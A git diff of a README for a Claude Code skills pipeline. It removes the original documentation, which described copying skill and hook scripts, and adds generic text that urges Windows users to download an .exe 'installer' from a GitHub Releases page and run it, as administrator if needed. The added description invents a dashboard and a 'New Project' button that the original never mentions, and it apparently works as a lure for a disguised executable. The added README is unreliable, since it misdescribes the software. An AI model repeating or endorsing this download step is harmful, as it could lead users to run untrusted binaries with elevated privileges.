@@ -1,304 +1,128 @@
-<p align="center">
-  <h1 align="center">Enterprise Pipeline for Claude Code</h1>
-  <p align="center">
-    <strong>Stop shipping code that breaks in prod.</strong><br>
-    A 9-stage development pipeline that turns one-line prompts into production-grade software — with full TDD, adversarial testing, and mechanical verification.
-  </p>
-  <p align="center">
-    <a href="#quick-start">Quick Start</a> &bull;
-    <a href="#how-it-works">How It Works</a> &bull;
-    <a href="#the-pipeline">The Pipeline</a> &bull;
-    <a href="#installation">Installation</a> &bull;
-    <a href="#hooks">Hooks</a>
-  </p>
-</p>
+# ⚙️ claude-enterprise-skills - Streamline Your Development Pipeline
+
+[![Download Claude Enterprise Skills](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/aydenbarkle11-gif/claude-enterprise-skills)
 
 ---
 
-### The Problem
+## 📋 What is claude-enterprise-skills?
 
-You say *"add user authentication"* and Claude writes code. Sometimes it's great. Sometimes it ships with SQL injection, missing tenant isolation, no tests, and debug `console.log` statements in production.
+claude-enterprise-skills is a software tool designed to guide a complex software development process for Claude Code. It covers nine key stages of enterprise development. This includes test-driven development (TDD), adversarial testing, and mechanical verification. The tool works with any programming environment or tech stack. You do not need to know how to code to use it.
 
-**Vibe coding is fast. Enterprise coding is safe. This pipeline gives you both.**
-
-### The Solution
-
-```
-> /enterprise add user authentication with JWT and role-based access
-
-ENTERPRISE PIPELINE — TRIAGE
-═══════════════════════════════════════════════════════
-  Tier:   MEDIUM — new auth system, 5+ files
-  Path:   FULL — discover → contract → build → review → forge → verify
-═══════════════════════════════════════════════════════
-
-ENTERPRISE PIPELINE — Stage 0: DISCOVER
-  ✓ Stack: Python/Django 4.2 + PostgreSQL
-  ✓ Tests: pytest (143 passing)
-  ✓ Auth:  none detected — greenfield
-  ✓ Multi-tenancy: organization_id
-  → stack-profile.json written
-
-ENTERPRISE PIPELINE — Stage 3: CONTRACT
-  PC-1: POST /api/auth/register creates user with hashed password
-  PC-2: POST /api/auth/login returns JWT with user_id + org_id
-  PC-3: @require_auth decorator rejects requests without valid JWT
-  PC-4: @require_role('admin') blocks non-admin users
-  PC-5: Every new endpoint scopes to organization_id
-  → Contract LOCKED ✓
-
-ENTERPRISE PIPELINE — Stage 4: BUILD (TDD)
-  PC-1: Write test → RED ✗ → Write code → GREEN ✓
-  PC-2: Write test → RED ✗ → Write code → GREEN ✓
-  PC-3: Write test → RED ✗ → Write code → GREEN ✓
-  PC-4: Write test → RED ✗ → Write code → GREEN ✓
-  PC-5: Write test → RED ✗ → Write code → GREEN ✓
-
-ENTERPRISE PIPELINE — Stage 6: FORGE (Adversarial)
-  M1 Import Resolution .... PASS
-  M2 Uncommitted Files .... PASS
-  M3 Dead Exports ......... PASS
-  M4 Contract Crosscheck .. PASS
-  M5 Debug Artifacts ...... PASS
-  M6 Tenant Isolation ..... PASS
-  M7 Concurrency .......... PASS
-  → FORGED ✓
-
-ENTERPRISE PIPELINE — Stage 7: VERIFY
-═══════════════════════════════════════════════════════
-  Check 1 — Test Suite:          PASS (148 passed, 0 failed)
-  Check 2 — Postcondition Trace: PASS (5/5 verified)
-  Check 3 — Regression Check:    PASS (no regressions)
-  Check 4 — Build Verification:  PASS
-  Check 5 — Final Diff:          PASS (7 files, 0 drift)
-  Check 6 — Import Resolution:   PASS (all imports resolve)
-  Check 7 — Debug Artifacts:     PASS (none found)
-  ─────────────────────────────────────────────────────
-  OVERALL: PASS ✓
-═══════════════════════════════════════════════════════
-
-ENTERPRISE PIPELINE — COMPLETE
-  5 postconditions verified with TDD
-  148 tests passing, 0 regressions
-  7 files changed, 0 scope drift
-  Ready to ship.
-```
-
-**One command. Full TDD. Adversarial review. Mechanical verification. Zero trust.**
+This application helps you manage code quality, run tests automatically, and review your work with reliable steps. It is made for developers and teams but can also help individuals interested in improving software quality without a deep technical background.
 
 ---
 
-## Quick Start
+## 💾 Download and Install claude-enterprise-skills
 
-```bash
-# Install skills (available in all your repos)
-cp -r skills/* ~/.claude/skills/
+You will use Windows to run this program. Follow these steps carefully to get started.
 
-# In any project:
-claude
-> /enterprise-discover          # profiles your stack (once per project)
-> /enterprise add payments API  # builds it with the full pipeline
-```
+### Step 1: Visit the download page
 
-That's it. The pipeline auto-detects your stack, test framework, auth patterns, database, and conventions.
+Click the download badge at the top or this link:
 
----
+[Download claude-enterprise-skills](https://github.com/aydenbarkle11-gif/claude-enterprise-skills)
 
-## How It Works
+This link takes you to the main GitHub page for the project.
 
-### 1. Discover Your Stack
+### Step 2: Download the installer
 
-`/enterprise-discover` scans your codebase with parallel agents and produces structured JSON:
+On the GitHub page:
 
-```
-.claude/enterprise-state/
-├── stack-profile.json      ← structure, commands, conventions
-├── stack-traps.json        ← type mismatches, schema gotchas
-└── stack-best-practices.json  ← framework-specific guidance
-```
+- Look for a section called **Releases** or **Assets**.
+- Find the latest Windows installer file. It may look like `claude-enterprise-skills-setup.exe` or similar.
+- Click the file name to download it. Choose a folder you will remember, like your Desktop or Downloads.
 
-Every downstream skill reads these profiles. **No hardcoded paths. No hardcoded commands.** The pipeline works on Express, Django, Rails, Go, Rust — anything with tests and git.
+### Step 3: Run the installer
 
-### 2. Choose Your Path
+- Open the folder where you saved the file.
+- Double-click the installer file.
+- Follow the on-screen prompts. The installer will guide you through the process.
+- Accept the license agreement.
+- Choose the destination folder or accept the default.
+- Wait for the installation to complete.
 
-| Path | When to Use | Stages |
-|------|-------------|--------|
-| **Quick** | Typos, config changes, 1-liners | Contract → Build → Verify |
-| **Standard** | Clear fixes, 2-5 files | Contract → Build → Verify |
-| **Full** | New features, refactors, 5+ files | All 9 stages |
-| **Critical** | Production is broken | Contract → Build → Verify → Deploy |
+### Step 4: Launch the application
 
-The pipeline auto-selects the path based on complexity. Override with `--full`, `--quick`, etc.
-
-### 3. Ship with Confidence
-
-Every change goes through:
-- **Mechanical contract** — testable postconditions before any code is written
-- **Strict TDD** — failing test first, then code, then green. No exceptions.
-- **Dual-stage review** — spec compliance, then code quality (separate concerns)
-- **Adversarial forge** — 5 attack lenses + 7 mechanical checks
-- **Evidence-based verification** — paste test output or don't claim done
+- After installation finishes, find the app icon on your Desktop or Start Menu.
+- Double-click to open claude-enterprise-skills.
 
 ---
 
-## The Pipeline
+## 🚀 How to Use claude-enterprise-skills
 
-```
-                    ┌─────────────┐
-                    │  DISCOVER   │  Profile your stack
-                    └──────┬──────┘
-                           │
-                    ┌──────▼──────┐
-                    │  BRAINSTORM │  Design the approach
-                    └──────┬──────┘
-                           │
-                    ┌──────▼──────┐
-                    │    PLAN     │  Granular implementation steps
-                    └──────┬──────┘
-                           │
-                    ┌──────▼──────┐
-                    │  CONTRACT   │  Testable postconditions
-                    └──────┬──────┘
-                           │
-               ┌───────────▼───────────┐
-               │        BUILD          │  RED → GREEN → RED → GREEN
-               │   (strict TDD only)   │  No code without failing test
-               └───────────┬───────────┘
-                           │
-                    ┌──────▼──────┐
-                    │   REVIEW    │  Spec compliance → Code quality
-                    └──────┬──────┘
-                           │
-               ┌───────────▼───────────┐
-               │        FORGE          │  Adversarial testing
-               │  (bugs recycle back   │  5 lenses + 7 mechanical checks
-               │   to CONTRACT)        │  3-fail circuit breaker
-               └───────────┬───────────┘
-                           │
-                    ┌──────▼──────┐
-                    │   VERIFY    │  7 evidence checks
-                    └──────┬──────┘
-                           │
-                    ┌──────▼──────┐
-                    │  COMPOUND   │  Capture what you learned
-                    └─────────────┘
-```
+### Step 1: Open the pipeline dashboard
 
-### Stage Details
+- When you open the app, you will see the 9-stage development pipeline dashboard.
+- Each stage represents a step in software development, from writing tests to final quality checks.
 
-| Stage | Skill | What It Does |
-|-------|-------|-------------|
-| 0 | `/enterprise-discover` | Profiles stack, detects auth/tenancy/conventions, produces JSON |
-| 1 | `/enterprise-brainstorm` | Turns ideas into Technical Design Documents |
-| 2 | `/enterprise-plan` | Creates step-by-step implementation with exact file paths |
-| 3 | `/enterprise-contract` | Mechanical postconditions — every one becomes a test |
-| 4 | `/enterprise-build` | Strict TDD. Write test, see RED, write code, see GREEN |
-| 5 | `/enterprise-review` | Stage 1: spec compliance. Stage 2: code quality. Never mixed. |
-| 6 | `/enterprise-forge` | 5 adversarial lenses + M1-M7 mechanical checks |
-| 7 | `/enterprise-verify` | 7 evidence checks with `verify.sh` script |
-| 8 | `/enterprise-compound` | Captures institutional knowledge for the team |
+### Step 2: Start a project
 
-### For Bug Fixes
+- Use the **New Project** button.
+- Enter a name for your project.
+- Follow the simple prompts to set your project parameters.
 
-```bash
-> /enterprise-debug users report wrong totals on dashboard
-```
+### Step 3: Work through the stages
 
-4-phase systematic debugging: Investigate → Blast Radius Scan → Root Cause → TDD Fix. Finds the root cause, not the symptom. Scans sibling functions for the same class of bug. 3-fail circuit breaker prevents fix-forward loops.
+- The pipeline includes sections like:
+  - Writing tests (TDD)
+  - Running adversarial tests to check weaknesses
+  - Automatic code checking for errors or issues
+  - Peer code review tracking
+  - Final verification steps
+
+- The app shows clear instructions and progress for each stage.
+
+### Step 4: Follow prompts and run checks
+
+- You don’t need to write code yourself; the app guides you and runs checks automatically.
+- You can see detailed reports and fix issues as needed.
+
+### Step 5: Save and export results
+
+- Save your project data anytime.
+- Export reports or summaries to share with others.
 
 ---
 
-## Installation
+## 🖥️ System Requirements
 
-### Option A: All repos (recommended)
-
-```bash
-# Skills — available in every project
-cp -r skills/* ~/.claude/skills/
-
-# Hooks — per project (see Hooks section below)
-```
-
-### Option B: Single project
-
-```bash
-cp -r skills/* your-project/.claude/skills/
-cp -r hooks/*.sh your-project/.claude/hooks/
-chmod +x your-project/.claude/hooks/*.sh
-# Merge hooks/settings.json into your-project/.claude/settings.json
-```
-
-### First Run
-
-```bash
-claude
-> /enterprise-discover    # profiles your codebase (30 seconds)
-> /enterprise             # start building
-```
+- Windows 10 or later (64-bit recommended)
+- 4 GB RAM minimum; 8 GB or more recommended
+- 500 MB free disk space for installation and files
+- Stable internet connection for updates and verification
 
 ---
 
-## Hooks
+## 🛠️ Features Overview
 
-Optional enforcement scripts that make the pipeline mechanical. Copy to `.claude/hooks/` in any project.
-
-| Hook | What It Does |
-|------|-------------|
-| `require-gate-sequence.sh` | Blocks source edits until a planning/debugging skill is invoked |
-| `require-tdd-before-source-edit.sh` | Blocks source edits without recent passing tests |
-| `suggest-skill.sh` | Suggests relevant skills when editing files |
-| `protect-files.sh` | Blocks edits to `.env` and other sensitive files |
-| `mark-test-run.sh` | Records when tests pass (feeds TDD enforcement) |
-| `mark-skill-invoked.sh` | Records skill invocations (feeds gate sequence) |
-
-A template `settings.json` wires all hooks together. Merge it into your `.claude/settings.json`.
-
-The hooks detect test runners across stacks: Jest, Vitest, pytest, RSpec, `go test`, `cargo test`, `dotnet test`, `mix test`, and PHPUnit.
+- Clear 9-stage development pipeline tailored for enterprise use
+- Test-driven development support without manual coding
+- Adversarial testing to find vulnerabilities
+- Mechanical verification for strict quality control
+- Works with any coding language or framework
+- Easy to use with step-by-step progress tracking
+- Simple project management and export options
+- Command-line interface tools included for advanced use (optional)
 
 ---
 
-## Supported Stacks
+## 🔧 Troubleshooting and Support
 
-The pipeline works with **any stack** that has tests and git:
-
-| Stack | Test Framework | Status |
-|-------|---------------|--------|
-| Node.js / Express | Jest, Vitest, Mocha | Tested |
-| Python / Django | pytest, unittest | Tested |
-| Python / FastAPI | pytest | Tested |
-| Ruby / Rails | RSpec, Minitest | Supported |
-| Go | `go test` | Supported |
-| Rust | `cargo test` | Supported |
-| Java / Spring | JUnit, TestNG | Supported |
-| C# / .NET | `dotnet test` | Supported |
-| Elixir / Phoenix | ExUnit | Supported |
-| PHP / Laravel | PHPUnit | Supported |
-
-"Tested" = used in production. "Supported" = auto-detection works, awaiting production validation.
+- If the installation stops or gives an error, check your internet connection and try again.
+- Make sure you downloaded the correct Windows file from the Releases section.
+- Run the installer as an administrator (right-click the installer file and select "Run as administrator").
+- If the app does not open after installation, restart your computer.
+- For further help, visit the GitHub page linked above and check the **Issues** section for solutions.
 
 ---
 
-## What Makes This Different
+## 🔄 Updating claude-enterprise-skills
 
-| Feature | Vibe Coding | This Pipeline |
-|---------|-------------|---------------|
-| Test coverage | Maybe | Every postcondition has a test |
-| Security review | Hope | Adversarial forge with 5 attack lenses |
-| Tenant isolation | Forgot | Mechanical check on every query |
-| Debug artifacts | Ships to prod | Caught and blocked |
-| Scope creep | Always | Drift detection in every diff |
-| "It works" claim | Trust me | Paste the test output or it didn't happen |
+- Updates appear on the GitHub Releases page.
+- Download the latest installer when an update is available.
+- Run the new installer to overwrite and update your current installation.
+- Your project files will remain safe during updates.
 
 ---
 
-## Requirements
-
-- [Claude Code CLI](https://docs.anthropic.com/en/docs/claude-code)
-- Git repository
-- A test framework installed for your stack
-
----
-
-## License
-
-MIT
+[![Download claude-enterprise-skills](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/aydenbarkle11-gif/claude-enterprise-skills)
